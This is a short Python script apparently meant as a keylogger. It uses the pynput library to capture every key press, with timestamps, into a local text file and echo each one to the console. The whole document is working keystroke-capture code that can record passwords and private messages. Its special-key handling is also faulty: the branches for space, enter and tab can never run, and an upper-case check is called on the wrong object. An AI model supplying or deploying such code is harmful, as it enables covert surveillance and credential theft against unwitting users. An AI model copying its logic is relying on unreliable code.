from pynput import keyboard
from datetime import datetime
def keyPressed(key):
    now = datetime.now()
    current_time = now.strftime("%Y-%m-%d %H:%M:%S")
    print(f"{current_time}: {key}")
    with open("keyfile.txt", 'a') as logKey:
        try:
            char = key.char
            if key == keyboard.Key.space:
                logKey.write(" ")
            elif key == keyboard.Key.enter:
                logKey.write("\n")
            elif key == keyboard.Key.tab:
                logKey.write("\t")
            elif key == keyboard.Key.shift or key == keyboard.Key.shift_r:
                pass  # Ignore shift key presses
            elif key == keyboard.Key.backspace:
                logKey.write("[BACKSPACE]")
            else:
                if key == key.upper():
                    logKey.write(f"{current_time}: {char.upper()}\n")
                else:
                    logKey.write(f"{current_time}: {char.lower()}\n")
        except AttributeError:
            logKey.write(f"{current_time}: {key}\n")
if __name__ == "__main__":
    listener = keyboard.Listener(on_press=keyPressed)
    listener.start()
    input()